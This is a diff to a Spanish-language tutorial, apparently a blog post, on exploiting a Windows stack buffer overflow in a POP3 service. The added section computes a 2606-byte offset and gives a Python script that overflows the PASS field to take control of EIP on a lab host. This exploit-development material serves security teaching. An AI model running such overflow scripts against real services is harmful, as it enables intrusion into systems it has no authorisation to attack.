@@ -161,7 +161,53 @@ if __name__ == '__main__':
 
 ```
 
-Ejecutamos el script y vemos que ahora el valor de EIP es 39694438. Bien pues ahora con pattern_offset podemos calcular exactamente cuantos carácteres tenemos que enviar justo antes de que se sobreescriba el EIP.
+Ejecutamos el script y vemos que ahora el valor de EIP es 39694438.
 
 ![](/assets/images/Stack-Buffer-Overflow-Windows/offset.png)
+
+Bien pues ahora con pattern_offset podemos calcular exactamente cuantos carácteres tenemos que enviar justo antes de que se sobreescriba el EIP.
+
+![](/assets/images/Stack-Buffer-Overflow-Windows/offset2.png)
+
+Tenemos que enviar exactamente 2606 carácteres, a partir de ahí se sobreescribirá el EIP. Vale, pues modificamos el script para enviar 2606 "A" y 4 "B", y si todo va bien veremos que EIP vale 0x42424242 que son nuestras "B", con lo cual tendremos el control del registro EIP, pudiendo insertar lo que queramos.
+
+```python
+#!/usr/bin/python
+#coding: utf-8
+
+from pwn import *
+import socket, sys
+
+if len(sys.argv) < 2:
+        print "\n[!] Uso: python " + sys.argv[0] + " <ip_address>\n"
+        sys.exit(0)
+
+#Variables globales
+ip_address = '192.168.1.20'
+rport = 110
+
+if __name__ == '__main__':
+
+        buffer = "A"*2606 + "B"*4
+
+        try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip_address, rport))
+
+                data = s.recv(1024)
+
+                s.send("USER ximo\r\n")
+                data = s.recv(1024)
+                s.send("PASS " + buffer + '\r\n')
+                data = s.recv(1024)
+
+        except:
+                print "\n[!] Ha habido un error de conexión\n"
+                sys.exit(1)
+
+```
+
+Ejecutamos el script y vemos que efectivamente EIP ahora vale 0x42424242 que son nuestras "B".
+
+![](/assets/images/Stack-Buffer-Overflow-Windows/offset3.png)
 
